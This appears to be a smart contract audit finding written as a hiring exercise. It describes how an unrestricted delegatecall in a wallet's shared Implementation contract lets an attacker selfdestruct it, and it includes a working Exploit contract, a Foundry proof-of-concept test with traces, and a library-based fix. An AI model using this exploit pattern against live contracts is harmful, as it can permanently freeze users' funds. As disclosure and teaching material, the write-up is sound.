# Spearbit Writing Exercise

## Wallet Protocol Business Requirments

You are given an implementation for a smart contract wallet. There are two contracts

1. [`Implementation.sol`](contracts/Implementation.sol): Deployed once and used as implementation contract in `Proxy.sol`.
2. [`Proxy.sol`](contracts/Proxy.sol): Each user has a unique `Proxy` deployment with the above implementation. This is a simply proxy contract which delegatecalls the implementation contract. It has an access control check that allows only the owner to use the fallback function.

The idea is that users can keep their funds, for example, ETH or ERC20 tokens in the Proxy. To use these funds, users can execute arbitrary calls and arbitrary delegatecalls by using the implementation contract (it has `callContract` and `delegatecallContract`). The implementation contract is deployed only once and reused to save gas.

## Implementation deletion causes DoS of users proxy contracts

**Severity:** Critical

**Impact:** 
An attacker could delete the implementation contract deployed for user proxy contracts. All users funds deposited to their proxy contracts could be stuck forever without any option to withdraw.

**Context:** [Implementation.sol#L9-L22](https://github.com/shabarkin/writing-exercise/blob/develop/src/Implementation.sol#L9-L22)

While reviewing the Proxy and Implementation smart contracts I have observed that Implementation contract is defined as a normal deployable smart contract, this allows an attacker to cause the DoS attack for all users of Proxy contract.
By application business requirment users should have ability to execute arbitrary `call` and arbitrary `delegatecall` functions by using their `Implementation` contract, however the current implementation of this has a side affect.

The `delegatecall` function preserves the state of the calling smart contract, but executes logic of the called smart contract/library. In this architecture the `Implementation` smart contract is deployed as independent smart contract, what means that anyone within the Ethereum network could invoke their functions. 

By deploying the malicious smart contract with a function, which defines `selfdestruct` operation, allows an attacker to "selfdelete" the `Implementation` contract. This may happen, because `Implementation.delegatecallContract` function uses `delegatecall` operation on the arbitrary address and arbitrary calldata. It will execute the logic of malicious function within the state of the `Implementation` contract, what means that the `selfdectruct` operation will be executed within the state of `Implementation` contract. 

The denial of service attack is achieved, because there will be no way to update the implementation of Proxy contract or to withdraw the user funds. Upon deletion of `Implementation` contract, all users funds holded within Proxy contracts will be stuck there forever.

The development and test running were completed with [Foundry](https://book.getfoundry.sh/) framework.


Example of code snippet for the main exploitation business logic: 
```solidity
// Proxy and Implementation contracts deployment
impl = new Implementation();
proxy = new Proxy(address(impl), deployer);

// send funds to deployer account
(bool success,) = deployer.call{value: 1000 ether}("");
if (!success){
    revert("funds are not deposited");
}

// Exploit contract deployment
vm.startPrank(attacker);
exploit = new Exploit();
vm.stopPrank();

// critical: The implementation deletion
vm.startPrank(attacker);

// pack calldata for Exploit contract
bytes memory _calldataExploit = abi.encodeWithSelector(exploit.destroy.selector, attacker);
// delete implementation contract through delegate call on the `selfdestruct`
impl.delegatecallContract(address(exploit), _calldataExploit);

vm.stopPrank();
 ```
 
Example of the check to determine the existance of the contract:
 ```solidity
 function _checkContractExistance(address _contract) private view returns (bool){
    uint256 size;
    assembly {
        size := extcodesize(_contract)
    }
    return size != 0;
}
 ```

Example of the malicious smart contract:
```solidity
contract Exploit {
    address immutable public owner = address(0x02);
    address public implementation;

    function destroy(address _to) public {
        selfdestruct(payable(_to));
    }
}
```

Download:
```
git clone https://github.com/shabarkin/writing-exercise.git
```

Execute the exploit test with Foundry:

```bash
forge test -vvvvv
```

Console output:
```log
Running 1 test for test/Proxy.t.sol:SpearbitImplementationDestructTest
[PASS] testImplementationDestruct() (gas: 8337)
Logs:
  Implementation contract exists: false

Traces:
  [490544] SpearbitImplementationDestructTest::setUp() 
    ├─ [123771] → new Implementation@0xCe71065D4017F316EC606Fe4422e11eB2c47c246
    │   └─ ← 618 bytes of code
    ├─ [96860] → new Proxy@0x185a4dc360CE69bDCceE33b3784B0282f7961aea
    │   └─ ← 371 bytes of code
    ├─ [3000] PRECOMPILE::ecrecover{value: 1000000000000000000000}() 
    │   └─ ← 
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000002) 
    │   └─ ← ()
    ├─ [55532] → new Exploit@0xE536720791A7DaDBeBdBCD8c8546fb0791a11901
    │   └─ ← 277 bytes of code
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000002) 
    │   └─ ← ()
    ├─ [6233] Implementation::delegatecallContract(Exploit: [0xE536720791A7DaDBeBdBCD8c8546fb0791a11901], 0x00f55d9d0000000000000000000000000000000000000000000000000000000000000002) 
    │   ├─ [5257] Exploit::destroy(0x0000000000000000000000000000000000000002) [delegatecall]
    │   │   └─ ← ()
    │   └─ ← 0x
    ├─ [0] VM::stopPrank() 
    │   └─ ← ()
    └─ ← ()

  [8337] SpearbitImplementationDestructTest::testImplementationDestruct() 
    ├─ [0] console::log(Implementation contract exists: %s, false) [staticcall]
    │   └─ ← ()
    └─ ← ()

Test result: ok. 1 passed; 0 failed; finished in 417.42µs
```


**Recommendation:**
Change the context of `Implementation` smart contract from contract to library. Update their functions by removing the `payable` 
modifier.

```diff
- contract Implementation {
+ library Implementation {

-   function callContract(address a, bytes calldata _calldata) payable external returns (bytes memory) {
+   function callContract(address a, bytes calldata _calldata) external returns (bytes memory) {
        (bool success , bytes memory ret) =  a.call{value: msg.value}(_calldata);
        require(success);
        return ret;
    }

-   function delegatecallContract(address a, bytes calldata _calldata) payable external returns (bytes memory) {
+   function delegatecallContract(address a, bytes calldata _calldata) external returns (bytes memory) {
        (bool success, bytes memory ret) =  a.delegatecall(_calldata);
        require(success);
        return ret;
    }
}
```

**Fix commit:** [87379dc](https://github.com/shabarkin/writing-exercise/commit/87379dc56ce658334e1dd367020aed16e6cdf0d5)
